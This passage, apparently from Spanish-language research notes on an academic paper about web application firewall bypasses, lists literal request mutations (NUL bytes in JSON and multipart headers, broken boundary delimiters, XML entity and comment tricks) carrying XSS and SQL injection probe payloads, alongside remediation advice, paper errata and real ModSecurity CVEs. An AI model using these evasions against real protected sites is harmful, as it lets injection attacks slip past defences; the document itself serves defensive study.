| `Content-Type: multipart/form-data; boundary=real;` *(y el cuerpo arranca sin línea en blanco)* | **punto y coma final** + separador de cuerpo ausente |

#### D — Byte NUL en el cuerpo JSON (3 posiciones distintas)
```
{"field1"\x00:"<script>alert(document.cookie)</script>"}     <- NUL entre el nombre y los dos puntos
{"field1\x00:"<script>alert(document.cookie)</script>"}      <- NUL dentro del nombre, comilla desbalanceada
{"f\x00eld1":"<script>alert(document.cookie)</script>"}      <- NUL en medio del nombre
```
El primero declara `Content-Length: 53` y los otros `52`: el NUL **cuenta como un byte**.
Dos de los tres se verificaron contra `/spring/json`.

#### E — Byte NUL en las cabeceras de parte multipart (6 posiciones)
| Mutación literal | Dónde |
|---|---|
| `conten\x00-extra: something` | nombre de una cabecera de parte |
| `content-disposition: form-da\x00a; name="field1"` | valor de `content-disposition` |
| `Content-Type: tex\x00t/plain;charset=UTF-8` | valor del `Content-Type` de la parte |
| `u\x00tf-8` | valor del charset **en el cuerpo** (parte `_charset_`) |
| `content-disposition: form-data; name="field1"\x00\n` | **NUL + LF desnudo** como separador de cabecera |
| `content-disposition: form-data; name="field1\x00"` | NUL **dentro** del nombre entrecomillado |

Cinco de los seis se verificaron contra `/flask/multipart`.

#### F — Manipulación del delimitador de boundary (3)
| Mutación literal | Nota |
|---|---|
| `-real` *(primer delimitador)*, el resto `--real` | **un solo guion** en el primero |
| `\r\n` *(primer delimitador eliminado entero)*, el resto `--real` | delimitador **ausente** |
| `boundary=real\r` + `\n--real` | **CR solitario**: se elimina el `\n` del primer CRLF (*Linefeed Removal*) |

#### G — Entidades, comentarios y desbalanceo en XML (4)
Todos combinan `&gt;` + comentario + entidad declarada en el DOCTYPE:
```
<genre:field1 attr="history">&gt;<!--this is a comment -->&writer;' and 1=1 --</genre:field1>
```
con una de estas corrupciones estructurales añadidas:

| Mutación | Nota |
|---|---|
| `]</BOOK>` | corchete de cierre de DOCTYPE **desbalanceado** al final |
| `j</genre:schema>` | **carácter suelto** antes del cierre |
| payload movido **fuera** de `<genre:field1>`, directo en `<BOOK>` | reubicación del payload |
| `<!ENTITY writer "hi">` + `&writer;` adyacente al payload | la entidad parte la cadena de ataque para el WAF |

### 11.6 — Las 24 clases de TABLE IV/V/VI (nombres oficiales)

Nombres exactos de las 12 clases multipart, para mapear contra las mutaciones de arriba:
`Boundary Delimiter Manipulation` · `Content-Disposition Disruption` ·
`Distorted Header Injection to Body` · `Content-Type Tweak in Body` ·
`Charset Value Alteration in Body` · `Header Separator Manipulation in Body` ·
`Content-Type Parameter Tweak` · `Boundary Delimiter Removal` · `Linefeed Removal` ·
`Whitespace Alteration` · `Disrupted Body Field` · `Boundary Header Tampering`.

Leyenda de las tablas, literal del caption de TABLE IV: *"Removals are displayed with a
strike-through text with a gray background, while additions and replacements are shown with
only a gray background."*

### 11.7 — Remediación

**Del propio paper:** HTTP-Normalizer, un proxy que valida las peticiones contra los RFC
vigentes. *"Our results demonstrate its effectiveness in normalizing or blocking all bypass
attempts presented in this work."* Está en `http-body-normalizer/` — **en código, sin
documentación**: su README tiene dos líneas y el README raíz admite *"Documentation Work In
Progress"*.

Es la aplicación directa del principio 0: **rechazar la ambigüedad en lugar de
reconciliarla.** Un WAF que no reconoce un `Content-Type` debería **bloquear**, no dejar
pasar sin inspeccionar — que es lo que hacen los cuatro bypasses del grupo A.

`# [derivado]` La regla operativa para un defensor: **si el WAF no puede parsear el cuerpo,
la petición no debe llegar al origen.** "No inspeccionado" tiene que ser un estado de
rechazo, no de aprobación silenciosa.

### 11.8 — Otras incoherencias internas del paper, registradas

- `1207` aparece **antes y después** de deduplicar (§VI-A) sin explicación.
- Conteo de frameworks inconsistente: §V-A dice 6; §V-C y la TABLE II listan 7.
- El *"más del 90%"* se apoya en **~50 sitios**, no 100: *"We chose the first 100 search
  results... About half of these webpages were excluded."*
- Referencia cruzada errónea: §V-E dice *"Table 4 provides the list of parsers"* cuando es
  la TABLE III, y mezcla numeración romana y árabe en la misma frase.
- Tres atribuciones de autoría erróneas en *Related Work*: *"Meiners et al."* [15] es
  Nguyen et al.; *"Freiling et al."* [16] es Jana y Shmatikov; *"Dalili's work"* [18] es una
  entrada sin autor.
- **Cero CVEs** en todo el paper.

### 11.9 — Bonus: CVEs reales hallados al verificar `wafrift`

Descarté `wafrift` como fuente por no dar WAF con versión. **Me equivoqué en parte:** fuera
de los dos ficheros que pedí, su código cita vulnerabilidades reales con producto, versión,
CVE y fecha:

| CVE | Producto | Nota |
|---|---|---|
| **CVE-2025-27110** | **libmodsecurity3 v3.0.13** | Regresión; corregida en **3.0.14**. Advisory de febrero 2025 |
| **CVE-2022-39956**<br>**CVE-2022-39957** | **OWASP CRS** anterior a 3.3.3 | Corregidas en **CRS 3.3.3 / 3.2.2**, septiembre 2022 |

Que una regresión en el propio motor de ModSecurity tenga CVE en 2025 es el recordatorio de
que **el WAF también es software con parser**, y por tanto sujeto al principio 0 de este
documento.

## 12 — Fuentes que NO entraron, y por qué

| Fuente | Motivo |
|---|---|
| **X/Twitter** (12 hunters) | `HTTP 402 Payment Required` en los tres perfiles probados. Inalcanzable. |
| **"Decepticon WAF Bypass skill"** | No localizable: ningún resultado menciona el nombre. |
| **`wafrift`** | Dos repos homónimos, ninguno canónico. Lo alcanzable es un **índice de estrategias de una herramienta**, sin WAF nombrado ni versión. Falla el criterio 2. Usable solo como taxonomía de nombres. |
| `botesjuan/Obfuscating-Techniques-WAF-Bypass`, `Ilias1988/waf-bypass` | Repos genéricos de GitHub: **prohibidos por contrato**. |
| Blogs de Medium "Bypassing WAFs in 2025" | Sin WAF nombrado con versión ni verificación. |

**Inventario completo de rechazos:** `_refactor/ELITE-REJECTED.md`.
